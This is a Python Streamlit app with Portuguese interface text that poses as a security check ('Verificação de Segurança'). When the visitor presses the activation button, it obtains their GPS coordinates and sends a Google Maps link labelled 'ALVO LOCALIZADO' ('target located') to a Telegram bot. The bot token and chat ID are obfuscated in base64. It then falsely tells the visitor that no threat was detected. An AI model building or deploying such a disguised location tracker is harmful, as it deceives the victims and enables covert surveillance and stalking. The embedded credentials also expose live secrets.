import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- DADOS PROTEGIDOS ---
B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
B_ID = "ODIxMDgyODM5OA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200
    except:
        return False

st.set_page_config(page_title="SEGURANÇA INTEGRADA", page_icon="🔐", layout="centered")

st.title("Verificação de Segurança")

if 'verificado' not in st.session_state:
    st.session_state.verificado = False

if not st.session_state.verificado:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        # TESTE IMEDIATO: Envia uma mensagem de teste antes de tudo
        enviar_telegram("🔄 Tentativa de conexão iniciada...")
        
        barra = st.progress(0)
        for i in range(1, 101):
            time.sleep(0.01)
            barra.progress(i)
        
        loc = get_geolocation()
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            if enviar_telegram(f"🚨 ALVO LOCALIZADO\n📍 Mapa: {mapa}"):
                st.session_state.verificado = True
                st.rerun()
            else:
                st.error("Erro: O bot não respondeu ao comando de envio.")
        else:
            st.warning("⚠️ Ative o GPS para concluir a verificação.")
else:
    st.success("Sistema Seguro: nenhuma ameaça foi detectada")
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

st.write("Miamy © 2026")
